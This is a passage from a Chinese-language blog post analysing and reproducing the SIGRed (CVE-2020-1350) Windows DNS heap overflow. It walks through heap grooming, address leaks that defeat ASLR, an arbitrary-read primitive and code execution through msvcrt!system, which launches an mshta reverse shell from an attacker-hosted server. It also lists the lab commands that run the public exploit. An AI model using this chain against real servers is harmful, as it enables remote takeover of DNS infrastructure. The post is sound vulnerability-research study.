<h2 id="0x07-exp原理"><a href="#0x07-exp原理" class="headerlink" title="0x07 exp原理"></a>0x07 exp原理</h2><p>​    其实这个漏洞利用最难的部分就是如何在不破坏堆的情况下，做一个类似反弹shell的东西？在本部分中涉及到的知识我也不能完全理解，只能说尽力而为吧。</p>
<p>参考，引用，翻译自：<br><a target="_blank" rel="noopener" href="https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred">https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred</a><br><a target="_blank" rel="noopener" href="https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228">https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228</a></p>
<p><strong>注：本部分图片以及文本均源自上述两个链接，并非原创，仅作翻译总结</strong></p>
<h3 id="一、背景知识"><a href="#一、背景知识" class="headerlink" title="一、背景知识"></a>一、背景知识</h3><h4 id="WinDNS-堆管理器（堆操作）"><a href="#WinDNS-堆管理器（堆操作）" class="headerlink" title="WinDNS 堆管理器（堆操作）"></a>WinDNS 堆管理器（堆操作）</h4><p>​    WinDNS 服务通过管理自己的内存池，以达到管理堆内存的目的。如果请求的缓冲区大小超过 0xA0 字节，它将从 Windows 本机堆管理器 ( <strong>HeapAlloc</strong> ) 请求内存；否则，它将使用memory pool bucket，每个bucket中的缓冲区都被储存在一个单链表中。如果所选memory pool bucket中没有更多可用缓冲区，则会从本机堆中请求一个内存块，划分为单独的缓冲区，然后添加到相应存储桶的列表中。</p>
<p>​    简单的说，就是WinDNS 管理自己的内存池。有 4 个内存池桶 用于不同的分配大小（0x50、0x68、0x88、0xa0）。如果所需的分配大小大于 0xa0，WinDNS 将使用本机 Windows 堆。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316084140261.png" alt="image-20220316084140261"></p>
<p>​    <em>上图为dns!Mem_Alloc 的反编译</em></p>
<p>‍</p>
<p>​    当其中一个内存桶中的缓冲区被释放时，它们不会返回到 Windows 本机堆。相反，它们会被添加回该存储桶的可用缓冲区列表中。缓冲区是按后进先出 (LIFO) 分配的，这意味着要释放的最后一个缓冲区将是下一个要分配的缓冲区。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316085438468.png" alt="image-20220316085438468"></p>
<p>​    <em>dns反编译！Mem_Free</em></p>
<h4 id="WinDNS-缓冲区结构"><a href="#WinDNS-缓冲区结构" class="headerlink" title="WinDNS 缓冲区结构"></a>WinDNS 缓冲区结构</h4><p>WinDNS 缓冲区的结构如下：</p>
<p>​    这个结构就是相当于缓冲区里没有东西时，应该放什么。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c6222017782f24e4d1_aa91b3_6a9906be77d3468aa059e7ce333c7027~mv2.png" alt="img"></p>
<p>在开发exp的过程中，我们需要用到这个结构。</p>
<h4 id="RR-record结构"><a href="#RR-record结构" class="headerlink" title="RR_record结构"></a>RR_record结构</h4><p>这个结构就是我们储存一条dns记录在堆中的结构。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c8c2e0bb08a5b1629f_aa91b3_2e95baa7527f41e3b4fc7dec0c87a822~mv2.png" alt="img"></p>
<h3 id="二、开辟地址，避免分段错误（打洞）"><a href="#二、开辟地址，避免分段错误（打洞）" class="headerlink" title="二、开辟地址，避免分段错误（打洞）"></a>二、开辟地址，避免分段错误（打洞）</h3><p>​    如果我们可以在一个连续堆段的中间触发释放缓冲区，然后重新分配它给另一条数据，这条数据我们构造溢出缓冲区，我们就可以获得一大片地址，但是于此同时，我们需要避免出现segfault。</p>
<p>​    那么，什么时候会发生segfault呢？顾名思义，就是当系统检测到地址放的东西与应该放的东西不一样的时候就会报错，那么系统监测发生在什么时候呢？就是在进行HeapAlloc 和 HeapFree 的时候，我们只要HeapFree的调用，就不会出现segfault</p>
<p>​    要做到上述的思路，我们可以通过向受害者客户端进行查询，通过控制恶意DNS服务器返回内容的 TTL（生存时间）来达成该思路，也就是说，生存时间足够长的记录只要一直不释放，系统就不会检测，不检测就不会出现segfault。<strong>注：过期记录每约 2 分钟释放一次。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c64336d0dccfe87280_aa91b3_bbbaa7f0334643eb838f44792c9f897f~mv2.png" alt="img"></p>
<p><em>恶意 DNS 服务器控制 TTL，使其增长</em></p>
<p>总结一下我们开辟一片连续稳定，用于溢出的堆地址的基本步骤：</p>
<ul>
<li>向受害者服务器多次查询恶意域的子域。</li>
<li>恶意 DNS 服务器会给受害者很多响应，受害者将其缓存在堆内存中（这些响应都没有溢出）。</li>
<li>恶意 DNS 服务器将为除一个之外的所有子域分配一个长 TTL（生存时间），只有一个子域有短TTL，所以他两分钟之后就会被释放。</li>
<li>两分钟后，我们短TTL的缓冲区被释放，并发生了检测，没有异常。</li>
<li>然后使用<strong>SIG</strong>消息查询，这一次恶意DNS服务器会返回溢出的数据。</li>
<li>因为缓冲区是 LIFO 分配的，所以新的记录缓冲区将与内存中刚刚过期，被释放的那条记录具有相同的地址。</li>
</ul>
<p>这也就是所谓的打一个洞。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c7d5712e436455c3d3_aa91b3_3524254ae14c4838b8d6e689e3927922~mv2.png" alt="img"></p>
<p><em>在堆中打一个洞以避免 SEGFAULT</em></p>
<p>​    当然，我们还可以做的更好，因为短 TTL 这一思路还必须要等待两分钟，在这两分钟里，其他的事件、或者其他人的请求有可能会打乱我们的攻击流程，让我们失去对于堆中所存数据的控制（就是容易时间一长就出问题）。所以我们需要一个方法达到瞬间释放缓冲区！</p>
<p>​    也就是，更改RR_record中的<strong>dwTTL</strong>和**dwTimeStamp **字段。为什么更改这个字段有效果呢？受害服务器记录了这条信息后，我们可以再次向他发出对于这条信息的请求，这样一来他就会再堆区中查询这条数据，但是他查到之后不会立刻返回给我们，而是会检查这条信息有没有过期，如果过期了，就会被释放。</p>
<p>​    简单地说，我们将<strong>dwTTL</strong>和**dwTimeStamp **字段置为0，然后再向受害者发送同样的查询信息，他就会主动将改记录的内存释放，也就达成了我们需要的可控释放（立即释放）。</p>
<p>‍</p>
<h3 id="三、泄漏内存地址"><a href="#三、泄漏内存地址" class="headerlink" title="三、泄漏内存地址"></a>三、泄漏内存地址</h3><h4 id="泄漏堆地址（相对地址）"><a href="#泄漏堆地址（相对地址）" class="headerlink" title="泄漏堆地址（相对地址）"></a>泄漏堆地址（相对地址）</h4><p>我们现在可以通过执行以下操作来泄漏堆中的地址：</p>
<ul>
<li>按照上文中提到的立刻释放的方法，释放假的<strong>RR_Record</strong>，这样一来，释放后的内存就会如同上文中提到的<strong>WinDNS 缓冲区结构</strong>一样，含有一条pNextFreeBuff的记录。</li>
<li>（这一步实际在上一步之前进行）给被释放record上面的那个假<strong>RR_Record</strong>一个大的<strong>wRecordSize</strong>，超过其实际大小。</li>
<li>向受害者发送子域的<strong>SIG</strong>查询，查询伪造的大<strong>wRecordSize</strong>的那条记录。</li>
<li>响应将超过缓冲区的实际大小，并在其下方包含已释放记录的<strong>WINDNS_FREE_BUFF</strong>结构数据。<strong>这会在pNextFreeBuff</strong>字段中泄漏一个有效的堆地址。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f7161c501cae7cf71c_aa91b3_67311c33ac5a4faea4a0a7839f284245~mv2.png" alt="img"></p>
<p><em>使用伪造的 RR_Record 对象泄漏堆指针</em></p>
<p>​    这样一来，如上图所示，蓝线上面的pNextFreeBuff就会返回到恶意服务器，我们获得了第一个内存泄漏！但是，我们实际上并不知道泄露的指针相对于我们控制的堆区域的位置，如果我们能得到溢出缓冲区的地址就更好了。因此，我们可以简单地释放两个假的<strong>RR_Record</strong>对象，并泄漏我们最后释放的缓冲区的地址。<strong>释放缓冲区时，指向在写入pNextFreeBuff</strong>字段之前已释放的缓冲区的指针。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f7dbe92852b3598189_aa91b3_3d7a3b96f79c4588b9c015366dc55366~mv2.png" alt="img"></p>
<p><em>泄漏指向堆的可控部分的指针</em></p>
<p>‍ 我们<br>现在知道了我们控制的部分堆的确切地址！这将在以后有用。</p>
<h4 id="泄露-dns-exe-地址（绝对地址）"><a href="#泄露-dns-exe-地址（绝对地址）" class="headerlink" title="泄露 dns.exe 地址（绝对地址）"></a>泄露 dns.exe 地址（绝对地址）</h4><p>​    接下来，我们需要在需要处理ASLR （地址空间布局随机化）。要泄漏<strong>dns.exe</strong>内部的地址，我们需要触发分配一种特殊类型的对象，我将其称为<strong>DNS_Timeout</strong>对象。</p>
<p>DNS_TimeOut对象具有以下结构：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f7558c6fdcb6eca7aa_aa91b3_27b27d797c8a42fb8bdc4d2a2537b3af~mv2.png" alt="img"></p>
<p>​    当 DNS 记录过期时，调用<strong>dns!RR_Free</strong>。如果 DNS 记录类型为<strong>DNS_TYPE_NS</strong>、<strong>DNS_TYPE_SOA</strong>、<strong>DNS_TYPE_WINS</strong>或<strong>DNS_TYPE_WINSR</strong> [<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants">6]</a>，它们不会立即释放。而是调用<strong>dns!Timeout_FreeWithFunctionEx</strong>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f717b25649351fc088_aa91b3_b9b5250b36a9499ba2d4376f60e28ca0~mv2.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316200416598.png" alt="image-20220316200416598"></p>
<p>（我好迷惑为什么我逆向的结果完全和他们不一样呢？）</p>
<p><em>dns的近似反编译！RR_Free</em></p>
<p>‍     在<strong>Timeout_FreeWithFunctionEx</strong>中，为<strong>DNS_Timeout</strong>对象分配了一个 WinDNS 缓冲区，然后，<strong>RR_Free</strong>的地址和一个字符串分别写入该对象的<strong>pFreeFunction</strong>和<strong>pszFile</strong>字段。这些将是我们的<strong>dns.exe</strong>地址泄漏。如果我们在我们控制的堆区域中触发超时对象的分配，我们可以使用与之前相同的方法来泄漏地址。</p>
<p>​    重点是将RR_Free函数的地址卸载了堆内存中，这是这个问题的关键。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f78cd2bc0e395094d4_aa91b3_a3e6de45bb44402ba503f7b68a6cbc03~mv2.png" alt="img"></p>
<p><em>dns!Timeout_FreeWithFunctionEx 的反编译</em></p>
<p>我们通过首先释放一个假缓冲区大小为 0x50的假<strong>RR_Record</strong>对象来触发对象分配，这是为 <strong>DNS_Timeout</strong> 对象分配的存储桶内存大小。然后，我们向受害者进行一些NS查询以获取恶意域。一旦记录过期，将为每个查询分配一个超时对象。如果在等待NS记录过期时释放了大小为 0x50 的新缓冲区，则有必要进行其中几个查询。我们可以再次通过请求其上方的缓存记录来泄漏内存，使用伪造的大<strong>wRecordSize</strong>。（总之呢，就是使用和上面一样的方法，但是不同的函数进行触发）</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f83c2a55b0a9f834c4_aa91b3_0faf3a4354db4d17a30d01f93830e3d6~mv2.png" alt="img"></p>
<p><em>通过分配 DNS_Timeout 对象泄漏 dns.exe 地址</em></p>
<p>现在我们已经泄露了<strong>dns.exe</strong>中的地址，我们可以使用它们来计算二进制文件中函数的地址。通过获取泄漏地址的最后 12 位，我们可以为各种版本的<strong>dns.exe</strong>创建一个到偏移量的映射。</p>
<p>最初，我认为我可以通过简单地使用<strong>wRecordType = DNS_TYPE_NS</strong>释放一个假的<strong>RR_Record</strong>对象来触发超时对象的分配<strong>。</strong>因此，避免了等待 2 分钟让 NS 记录过期。但是，当我尝试执行此操作时，一些检查会阻止使用修改后的<strong>wRecordType在fakeRR_Recor</strong>d上调用<strong>RR_Free</strong>。我在调查这个问题时没有时间，所以这是一个潜在的改进领域。</p>
<h3 id="四、任意读取"><a href="#四、任意读取" class="headerlink" title="四、任意读取"></a>四、任意读取</h3><p>​    请注意，通过上文中提到覆盖<strong>RR_free</strong>的方法，我们已经能够通过覆盖已分配的<strong>DNS_timeout</strong>对象中的<strong>pFreeFunction</strong>指针来执行代码。</p>
<p>​    更进一步的，在函数<strong>dns!Timeout_CleanupDelayedFreelist</strong>中，为<strong>CoolingDelayedFreeList</strong>中的每个超时对象（ <strong>DNS_Timeout</strong> 对象）调用<strong>pFreeFunction</strong>中的函数地址，简言之，就是通过列表的方式调用函数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f83c2a55e988f834c3_aa91b3_5268b6c5246d486b8796c1026e1c28f8~mv2.png" alt="img"></p>
<p><em>dns!Timeout_CleanupDelayedFreeList 的近似反编译</em></p>
<p>​    我们可以在分配超时对象覆盖这些字段后再次触发漏洞。</p>
<p>​    现代版本的<strong>dns.exe</strong>使用 Control Flow Guard (CFG) [<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">4]</a>进行编译。绕过 CFG 的一种已知方法是破坏堆栈[<a target="_blank" rel="noopener" href="https://improsec.com/tech-blog/bypassing-control-flow-guard-in-windows-10">11]</a>上的返回地址并使用 ROP [<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Return-oriented_programming">7]</a>方法执行。<em>注：CFG是一种在在运行时加载地址的防漏洞方式。</em>但是，我们目前还没有稳定的方式来写入堆栈。相反，我们可以找到用于原语的有效调用目标（即<strong>dns.exe中的函数）。</strong></p>
<p>​    一个合适的候选者是<strong>dns!NsecDnsRecordConvert</strong>，它采用一个参数[<a target="_blank" rel="noopener" href="https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228">3]</a>。</p>
<p><strong>NsecDnsRecordConvert</strong>的参数应具有以下结构：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f83c2a55ae18f834c5_aa91b3_9d45541820f94f49a93ee8e423e4165e~mv2.png" alt="img"></p>
<p>​    在这个函数内部，分配了一个缓冲区并调用了<strong>Dns_StringCopy</strong>，如果我们控制传入的函数参数及其内容，我们就可以将<strong>pDnsString</strong>字段设为我们要读取的地址。在<strong>DNS_StringCopy</strong>内部，分配了一个缓冲区，并复制了<strong>pDnsString</strong>指向的数据（直到一个空字节），也就是通过这个函数实现任意读取。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f8db0ccecdb0e7edbb_aa91b3_31668603d0c740689bd13149ef90472a~mv2.png" alt="img"></p>
<p><em>dns的反编译！NsecDnsRecordConvert</em></p>
<p>​    因为我们还控制<strong>wSize</strong>，所以我们控制分配的缓冲区的大小。因此，我们强制将新缓冲区分配到我们控制的堆区域中。数据复制完成后，我们使用与之前相同的方法泄漏内存。</p>
<p><img src="https://uploads-ssl.webflow.com/61a8a9fbeff4dc7f21784049/61bb52f87784b7988275f8a1_aa91b3_7152eedcbcb64374bc3bbaf325d91518~mv2.png" alt="img"></p>
<p><em>任意读取原语</em></p>
<p>​    ‍ 我们读取的<strong>msvcrt.dll</strong>的地址。我选择了<strong>dns!_imp_exit</strong>，其中包含<strong>msvcrt!exit</strong>的地址。这将破坏<strong>msvcrt.dll</strong>的 ASLR 。有了这个，我们可以计算出<strong>msvcrt!system</strong>的地址。</p>
<h3 id="五、代码执行与shell连接"><a href="#五、代码执行与shell连接" class="headerlink" title="五、代码执行与shell连接"></a>五、代码执行与shell连接</h3><p>​    现在所有部分都已准备就绪，可以远程执行代码了。我们可以再次触发<strong>DNS_Timeout</strong>对象的分配。然后，我们用<strong>msvcrt!system</strong>和<strong>pFreeFuncParam</strong>覆盖<strong>pFreeFunction</strong> ，并使用包含有效负载命令的内存堆地址。为了获得反向 shell，我选择使用<strong>mshta.exe</strong>从攻击者托管的 HTTP 服务器执行 HTA shell。我发现这是最简单的解决方案，但还有许多其他可能性。该漏洞也可以被重新设计以使用任何其他函数而不是<strong>system</strong>。</p>
<p><strong>Mshta.exe：</strong></p>
<blockquote>
<p>​    Mshta.exe运行MicrosoftHTML应用程序主机，这是WindowsOS实用程序，负责运行HTA(HTML应用程序)文件。我们可以用来运行JavaScript或VBScript的HTML文件。您可以使用MicrosoftMSHTA.exe工具解释这些文件。</p>
<p>现在，通过受害者计算机上的mshta.exe(容易受到RCE攻击)运行恶意代码，以获取Meterpreter会话。</p>
<p>总之呢，就是在达成rce之后，就可以通过Mshta.exe来构造一个反弹shell，应该是这个意思吧。</p>
</blockquote>
<h2 id="0x08-exp的利用"><a href="#0x08-exp的利用" class="headerlink" title="0x08 exp的利用"></a>0x08 exp的利用</h2><p><strong>实验环境：</strong>ubuntu20.04+Win server2019</p>
<p>利用步骤：</p>
<p>​    首先要把ubuntu的53端口系统进程杀死，然后执行指令：</p>
<ol>
<li><code>sudo python3 configure.py -ip 192.168.6.131 -p 8081 -hp 80</code></li>
<li><code>sudo python3 evildns.py</code></li>
<li><code>python3 exploit.py -ip 192.168.6.129 -d cve1350.com</code></li>
<li><code>python3 reverse_shell/server.py -p 8081</code></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220315174042283.png" alt="image-20220315174042283"></p>
<p>效果：（远程控制）</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316153134148.png" alt="image-20220316153134148"></p>
<h2 id="0x09-参考文献"><a href="#0x09-参考文献" class="headerlink" title="0x09 参考文献"></a>0x09 参考文献</h2><p>提供poc脚本：<br><a target="_blank" rel="noopener" href="https://github.com/maxpl0it/CVE-2020-1350-DoS">https://github.com/maxpl0it/CVE-2020-1350-DoS</a></p>
<p>优秀指导教程：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/PsgQ/p/14806195.html#/c/subject/p/14806195.html">https://www.cnblogs.com/PsgQ/p/14806195.html#/c/subject/p/14806195.html</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gdPUGnFLKzS5FqcH8T9byw">https://mp.weixin.qq.com/s/gdPUGnFLKzS5FqcH8T9byw</a><br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-260712.htm">https://bbs.pediy.com/thread-260712.htm</a></p>
<p>checkpoint：<br><a target="_blank" rel="noopener" href="https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/">https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/</a></p>
<p>exp思路、源代码、运用：</p>
<p><a target="_blank" rel="noopener" href="https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred">https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/chompie1337/SIGRed_RCE_PoC">https://github.com/chompie1337/SIGRed_RCE_PoC</a></p>
<p>exp构造原理：</p>
<p><a target="_blank" rel="noopener" href="https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228">https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">lhl_2507</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://lhl7.github.io/2022/03/10/CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">https://lhl7.github.io/2022/03/10/CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/index.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/14/CVE-2020-16898%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="/img/index.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CVE-2020-16898漏洞分析与复现</div></div></a></div><div class="next-post pull-right"><a href="/2022/03/08/x64%E6%B1%87%E7%BC%96%E4%BC%A0%E5%8F%82%E8%B0%83%E7%94%A8%E8%A7%84%E5%88%99/"><img class="next-cover" src="/img/index.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">64位调用约定与函数传参</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lhl_2507</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">47</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lhl7" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">CVE-2020-1350漏洞分析与复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">0x01漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-DNS%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 DNS协议与攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%85%B3%E4%BA%8EDNS%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.1.</span> <span class="toc-text">一、关于DNS协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Windows%E4%B8%AD%E7%9A%84DNS%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.2.</span> <span class="toc-text">二、Windows中的DNS模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">三、通信流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%EF%BC%88NAT%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">网络配置（NAT）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8Windows-server-2016%E4%B8%8A%E9%85%8D%E7%BD%AEDNS%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.2.</span> <span class="toc-text">在Windows server 2016上配置DNS服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%87%BD%E6%95%B0%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="toc-number">1.4.1.</span> <span class="toc-text">一、函数逻辑分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81DNS%E5%8D%8F%E8%AE%AE%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.4.2.</span> <span class="toc-text">二、DNS协议流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E5%8C%85%E6%80%BB%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">DNS包总结构：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Header"><span class="toc-number">1.4.2.1.1.</span> <span class="toc-text">Header:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Question%EF%BC%9A"><span class="toc-number">1.4.2.1.2.</span> <span class="toc-text">Question：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Answer%EF%BC%9A"><span class="toc-number">1.4.2.1.3.</span> <span class="toc-text">Answer：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sig%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">sig类型数据包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-POC%E4%BD%BF%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 POC使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%95%B0%E6%8D%AE%E6%9E%84%E9%80%A0%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.</span> <span class="toc-text">一、数据构造原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81checkpoint-POC%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90"><span class="toc-number">1.5.2.</span> <span class="toc-text">二、checkpoint POC构造分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81POC%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.3.</span> <span class="toc-text">三、POC执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 流量分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-exp%E5%8E%9F%E7%90%86"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 exp原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.7.1.</span> <span class="toc-text">一、背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WinDNS-%E5%A0%86%E7%AE%A1%E7%90%86%E5%99%A8%EF%BC%88%E5%A0%86%E6%93%8D%E4%BD%9C%EF%BC%89"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">WinDNS 堆管理器（堆操作）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WinDNS-%E7%BC%93%E5%86%B2%E5%8C%BA%E7%BB%93%E6%9E%84"><span class="toc-number">1.7.1.2.</span> <span class="toc-text">WinDNS 缓冲区结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RR-record%E7%BB%93%E6%9E%84"><span class="toc-number">1.7.1.3.</span> <span class="toc-text">RR_record结构</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%BC%80%E8%BE%9F%E5%9C%B0%E5%9D%80%EF%BC%8C%E9%81%BF%E5%85%8D%E5%88%86%E6%AE%B5%E9%94%99%E8%AF%AF%EF%BC%88%E6%89%93%E6%B4%9E%EF%BC%89"><span class="toc-number">1.7.2.</span> <span class="toc-text">二、开辟地址，避免分段错误（打洞）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B3%84%E6%BC%8F%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80"><span class="toc-number">1.7.3.</span> <span class="toc-text">三、泄漏内存地址</span></a><ol 